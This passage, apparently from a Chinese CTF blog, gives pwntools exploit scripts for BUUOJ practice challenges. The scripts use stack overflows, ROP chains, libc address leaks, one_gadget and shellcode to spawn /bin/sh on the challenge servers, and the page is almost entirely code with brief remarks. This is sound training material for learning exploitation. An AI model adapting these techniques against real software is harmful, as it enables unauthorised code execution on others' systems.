:u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">system &#x3D; 0x80489b8</span><br><span class="line">payload &#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)</span><br><span class="line">payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(payload)</span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure><blockquote><p>这里主要是gets这个函数没有退出，所以需要exit来强制退出，之后读flag就行</p></blockquote><p>第二中 静态链接应该想到ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int_0x80 = <span class="number">0x0806d7e5</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">gets_addr = <span class="number">0x0804F630</span></span><br><span class="line">pop_ebx_ret =  <span class="number">0x080481ad</span>  <span class="comment">#0x080481ad : pop ebx ; ret</span></span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">bss_addr = <span class="number">0x080ECD70</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26722</span>)</span><br><span class="line">p = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn4"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">56</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b"/bin/sh"</span>)</span><br><span class="line">payload2 = <span class="string">b"A"</span>*<span class="number">0x38</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)  +p32(bss_addr) + p32(int_0x80)</span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29937</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./LibC"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>var[13] = ‘\x11’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>sysytem和/bin/sh都有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)</span><br><span class="line">bin_sh &#x3D; 0x0804A024</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)</span><br><span class="line">sys &#x3D; elf.plt[&quot;system&quot;]</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="not-the-same-3dsctf-2016（32位write调用）"><a href="#not-the-same-3dsctf-2016（32位write调用）" class="headerlink" title="not_the_same_3dsctf_2016（32位write调用）"></a>not_the_same_3dsctf_2016（32位write调用）</h2><p>把bss段上的flag直接通过write函数拿出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)</span><br><span class="line">bss&#x3D;0x080eca2d</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)</span><br><span class="line">#print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>主要来熟悉一下这个东西</p><p>one_gadget</p><p>有libc基址直接就可以上one_gadget</p><blockquote><p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">ru(&quot;here is the gift for u:&quot;)</span><br><span class="line">printf &#x3D; int(ru(&#39;\n&#39;)[2:],16)</span><br><span class="line"></span><br><span class="line">libcbase &#x3D; printf - libc.sym[&quot;printf&quot;]  </span><br><span class="line">one_gadget &#x3D; 0x106ef8</span><br><span class="line">leak(&quot;printf&quot;,libcbase)</span><br><span class="line">sys &#x3D; libcbase + one_gadget</span><br><span class="line">payload &#x3D; str(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sl(32)</span><br><span class="line">sys &#x3D; 0x4006E6</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x400490</span><br><span class="line">bin_sh &#x3D; 0x601048</span><br><span class="line">pop_rdi &#x3D; 0x400683</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x4004C0</span><br><span class="line">bin_sh &#x3D; 0x600A90</span><br><span class="line">pop_rdi &#x3D; 0x4006b3</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><blockquote><p>写shellcode要注意不同架构下</p><p>shellcode是不同的</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret &#x3D; 0x4004c9</span><br><span class="line">bss &#x3D; 0x601080</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">print(len(shellcode))</span><br><span class="line">sla(&quot;tell me your name\n&quot;,shellcode)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)</span><br><span class="line">sla(&quot;me?\n&quot;,payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><blockquote><p>32位puts泄露</p><p>但好像put的got表不可以泄露</p><p>需要试一试其他的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29708</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(log)</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Please input new log info:"</span>)</span><br><span class="line">    sl(log)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn14"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">main = <span class="number">0x8048722</span></span><br><span class="line">sys = <span class="number">0x80484D0</span></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(puts_plt) + p32(main) + p32(printf_got)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">printf = uu32(r(<span class="number">4</span>))</span><br><span class="line">print(printf)</span><br><span class="line">libc = LibcSearcher(<span class="string">"printf"</span>,printf)</span><br><span class="line">libc_base = printf - libc.dump(<span class="string">"printf"</span>)</span><br><span class="line">leak(<span class="string">"printf"</span>,libc_base)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="铁人三项-第五赛区-2018-rop-32位write泄露"><a href="#铁人三项-第五赛区-2018-rop-32位write泄露" class="headerlink" title="铁人三项(第五赛区)_2018_rop(32位write泄露)"></a>铁人三项(第五赛区)_2018_rop(32位write泄露)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27242</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn15"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484C6</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">leak(<span class="string">"write"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop-64位puts泄露"><a href="#bjdctf-2020-babyrop-64位puts泄露" class="headerlink" title="bjdctf_2020_babyrop(64位puts泄露)"></a>bjdctf_2020_babyrop(64位puts泄露)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27648</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn17"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4006AD</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">"Pull up your sword and tell me u story!\n"</span>,payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\n'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">leak(<span class="string">"puts"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>连上就有</p><h2 id="pwn2-sctf-2016（32位printf泄露）"><a href="#pwn2-sctf-2016（32位printf泄露）" class="headerlink" title="pwn2_sctf_2016（32位printf泄露）"></a>pwn2_sctf_2016（32位printf泄露）</h2><blockquote><p>好像prinf的got表打不通</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28222</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn19"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib32/libc.so.6")</span></span><br><span class="line">vuln = <span class="number">0x804852F</span></span><br><span class="line">formats = <span class="number">0x80486A8</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(printf_plt) + p32(vuln) + p32(atoi_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">atoi = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"atoi"</span>,atoi)</span><br><span class="line">libc_base = atoi - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(sys) +p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop2-64位printf泄露"><a href="#HarekazeCTF2019-baby-rop2-64位printf泄露" class="headerlink" title="[HarekazeCTF2019]baby_rop2(64位printf泄露)"></a>[HarekazeCTF2019]baby_rop2(64位printf泄露)</h2><blockquote><p>经常会出现泄露printf的got表不行的情况</p><p>尽量用其他的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 